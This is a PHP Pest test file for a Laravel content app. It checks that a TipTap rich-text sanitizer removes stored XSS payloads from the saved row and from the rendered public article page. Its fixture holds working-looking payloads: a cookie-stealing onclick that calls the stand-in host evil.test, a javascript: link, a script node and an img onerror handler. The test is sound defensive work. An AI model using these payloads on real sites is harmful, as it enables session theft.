<?php

declare(strict_types=1);

use App\Domain\Content\Enums\ArticleStatus;
use App\Domain\Content\Models\Article;
use App\Domain\Content\Models\Category;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Storage;

use function Pest\Laravel\actingAs;
use function Pest\Laravel\get;

uses(RefreshDatabase::class);

/*
 * THE SECURITY TEST (CONTRACT §5/§10/§11.7, SPEC §3.3 — stored XSS is the #1 risk
 * for this domain because TipTap content is rich user HTML/JSON). The sanitizer
 * runs on the way IN (sanitize-on-store is authoritative, gate decision C), so:
 *   1. the PERSISTED DB row content must contain none of the dangerous tokens; and
 *   2. the rendered public SHOW page HTML must contain no executable payload.
 * Both halves are asserted so neither the storage layer nor the render layer can
 * silently regress. Runs on PostgreSQL 18 via RefreshDatabase.
 *
 * SLICE-003 RETROFIT (§17 firewall): the store request runs through 'org.scope',
 * which CONFINES the acting editor (null org here → fail-closed) for the rest of the
 * request AND leaves that confinement on the per-request OrganizationContext
 * singleton afterwards. So the post-request reads of the persisted row use
 * withoutGlobalScopes() — the UNIGES pattern — to read the PHYSICAL article
 * regardless of the leftover confinement. This is a read-mechanism change only; the
 * sanitizer assertions are untouched.
 */

/** A maliciously crafted TipTap document carrying every payload class. */
function maliciousDoc(): array
{
    return [
        'type' => 'doc',
        'content' => [
            [
                'type' => 'paragraph',
                'attrs' => [
                    'onclick' => 'document.location="https://evil.test/"+document.cookie',
                    'style' => 'position:fixed;top:0;left:0;width:100vw;height:100vh',
                ],
                'content' => [
                    ['type' => 'text', 'text' => 'legitimate paragraph text'],
                    [
                        'type' => 'text',
                        'text' => 'click me',
                        'marks' => [['type' => 'link', 'attrs' => ['href' => 'javascript:alert(document.cookie)']]],
                    ],
                ],
            ],
            // A raw <script> node masquerading as a TipTap node type.
            ['type' => 'script', 'content' => [['type' => 'text', 'text' => 'alert("xss")']]],
            // An <img onerror=…> style node.
            ['type' => 'image', 'attrs' => ['src' => 'x', 'onerror' => 'alert(1)']],
        ],
    ];
}

it('strips every dangerous token from the persisted DB row content', function (): void {
    Storage::fake('public');
    $category = Category::factory()->create();

    actingAs(User::factory()->editor()->create())
        ->post(route('admin.articles.store'), [
            'title' => 'XSS attempt',
            'content' => maliciousDoc(),
            'category_id' => $category->getKey(),
        ])
        ->assertRedirect()
        ->assertSessionHasNoErrors();

    $persisted = json_encode(
        Article::query()->withoutGlobalScopes()->where('title', 'XSS attempt')->sole()->content,
        JSON_THROW_ON_ERROR,
    );

    expect($persisted)
        ->not->toContain('script')
        ->not->toContain('onerror')
        ->not->toContain('onclick')
        ->not->toContain('javascript:')
        ->not->toContain('alert(')
        ->not->toContain('document.cookie')
        ->not->toContain('style')
        // …while the legitimate prose survives the cleansing.
        ->and($persisted)->toContain('legitimate paragraph text');
});

it('renders the public show page without any executable payload', function (): void {
    Storage::fake('public');
    $category = Category::factory()->create();

    // Persist directly with hostile content, then PUBLISH it so the public route serves it.
    // The store path sanitizes; here we additionally force a published, slugged row.
    actingAs(User::factory()->editor()->create())
        ->post(route('admin.articles.store'), [
            'title' => 'Public XSS attempt',
            'content' => maliciousDoc(),
            'category_id' => $category->getKey(),
        ])
        ->assertRedirect();

    $article = Article::query()->withoutGlobalScopes()->where('title', 'Public XSS attempt')->sole();

    // Move it to a publicly-servable state (published).
    $article->forceFill([
        'status' => ArticleStatus::Published,
        'published_at' => now(),
        'featured_image_path' => 'articles/2026/06/cover.jpg',
    ])->save();

    $html = get(route('articles.show', $article->slug))
        ->assertOk()
        ->getContent();

    // The Inertia HTML carries the page props as JSON in data-page; whether parsed
    // by the client renderer or read raw, no executable handler/scheme survives.
    expect($html)
        ->not->toContain('javascript:alert')
        ->not->toContain('onerror=')
        ->not->toContain('onclick=')
        ->not->toContain('<script>alert')
        ->not->toContain('document.cookie');
});
